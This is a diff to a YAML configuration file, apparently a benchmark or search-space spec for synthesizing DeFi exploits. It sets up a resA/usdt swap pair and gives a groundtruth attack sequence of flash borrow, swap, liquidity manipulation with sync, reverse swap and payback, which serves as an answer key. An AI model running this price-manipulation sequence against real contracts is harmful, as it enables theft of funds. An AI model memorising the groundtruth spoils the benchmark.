@@ -18,11 +18,12 @@ ctrt_name2deploy:
   - ["router", ""]
 
 extra_actions:
-  - "function addliquidity_pair_resA() internal {
-      resA.thisAToB();
+  - "function addliquidity_resA_pair_resA_usdt() internal eurus {
+    resA.thisAToB();
+    pair.sync();
     }"
 
-extra_deployments: 
+extra_deployments:
   - "resA.afterDeploy(address(pair), address(router), address(usdt));"
   - "resA.transfer(address(resA), 1000000e8);"
 
@@ -31,12 +32,11 @@ extra_statements: []
 attack_goal_str: "usdt"
 
 groundtruth:
-  - ["borrow", "owner", "resA", "1000000e8"]
-  - ["swap", "pair", "resA", "usdt", "resA.balanceOf(attacker)"]
-  - ["addliquidity", "pair", "resA"]
-  - ["sync", "pair"]
-  - ["swap", "pair", "usdt", "resA", "90000e18"]
-  - ["payback", "owner", "resA", "1000000e8 * 1003 / 1000"]
+  - ["borrow", "resA", "owner", "1000000e8"]
+  - ["swap", "pair", "attacker", "resA", "usdt", "resA.balanceOf(attacker)", "pair.getAmountOut(resA.balanceOf(attacker), address(resA))"]
+  - ["addliquidity", "resA", "pair", "resA", "usdt"]
+  - ["swap", "pair", "attacker", "usdt", "resA", "90000e18", "pair.getAmountOut(90000e18, address(usdt))"]
+  - ["payback", "resA", "owner", "1000000e8 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
@@ -56,7 +56,8 @@ roles:
     is_stablecoin: false
   "pair":
     is_swappair: true
-    uniswap_order: ["usdt", "resA"]
+    is_uniswap: true
+    token_pair: ["usdt", "resA"]
     support_swaps:
       "usdt": ["usdt", "resA"]
       "resA": ["usdt", "resA"]
